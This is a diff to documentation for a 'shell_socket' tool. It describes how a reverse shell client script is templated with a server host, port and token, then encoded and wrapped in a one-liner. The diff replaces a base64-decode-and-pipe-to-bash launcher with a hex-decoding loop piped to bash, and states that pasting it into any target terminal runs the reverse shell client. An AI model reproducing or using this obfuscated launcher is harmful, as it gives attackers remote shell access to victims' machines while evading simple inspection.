@@ -57,10 +57,10 @@ The server monitors the incoming stream, immediately yielding output chunks to t
 The `shell_socket` client bootstrap script is prepared through a 3-step pipeline:
 
 1. **Template Interpolation**: Injects server host, port, and acknowledgment token into `shell_socket_client.sh`.
-2. **Base64 Payload Encoding**: Encodes the rendered script into Base64 ASCII bytes, removing newline and quote escaping friction across different shell environments.
+2. **Hex Payload Encoding**: Encodes the rendered script into hexadecimal ASCII bytes, avoiding newline and quote escaping across different shell environments.
 3. **Self-Contained Subshell Wrapper**: Delivers the launcher in a `LauncherDelivery` envelope configured with `ShellSocketRuntime.DEFAULT_WRAPPER_TEMPLATE`:
    ```bash
-   (echo '$DECLUSOR_SCRIPT'|base64 -d|bash)
+    bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\x$byte"; done | bash' _ '$DECLUSOR_SCRIPT'
    ```
    Pasting this command into any target terminal decodes and executes the reverse shell client inside an isolated subshell.
 
